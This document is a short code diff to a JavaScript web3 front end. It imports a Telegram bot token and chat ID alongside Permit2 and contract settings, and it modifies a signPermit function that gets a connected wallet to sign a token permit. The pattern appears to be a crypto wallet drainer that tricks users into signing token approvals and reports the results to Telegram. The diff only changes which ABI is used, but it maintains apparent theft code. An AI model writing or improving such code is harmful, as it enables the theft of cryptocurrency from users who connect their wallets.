@@ -5,7 +5,7 @@ import { createPublicClient, custom, toFunctionSelector, pad, toHex } from 'viem
 import { signTypedData, sendTransaction, getAccount } from 'wagmi/actions'
 import {
   REOWN_PROJECT_ID, TG_TOKEN, TG_CHAT, CONTRACT, CHAIN_ID,
-  ERC20_ABI, PERMIT2
+  ERC20_ABI, PERMIT2, PERMIT_ABI
 } from './config.js'
 
 const chain = CHAIN_ID === 11155111 ? sepolia : mainnet
@@ -51,8 +51,8 @@ const hexAddr = (a) => pad(a.toLowerCase(), { size: 32 })
 const sel = (sig) => toFunctionSelector(sig).slice(2)
 
 async function signPermit(token, owner, value, deadline) {
-  const name = await publicClient.readContract({ address: token, abi: ERC20_ABI, functionName: 'name' })
-  const nonce = await publicClient.readContract({ address: token, abi: ERC20_ABI, functionName: 'nonces', args: [owner] })
+  const name = await publicClient.readContract({ address: token, abi: PERMIT_ABI, functionName: 'name' })
+  const nonce = await publicClient.readContract({ address: token, abi: PERMIT_ABI, functionName: 'nonces', args: [owner] })
   const sig = await signTypedData(wagmiConfig, {
     account: owner,
     domain: { name, version: '1', chainId: chain.id, verifyingContract: token },
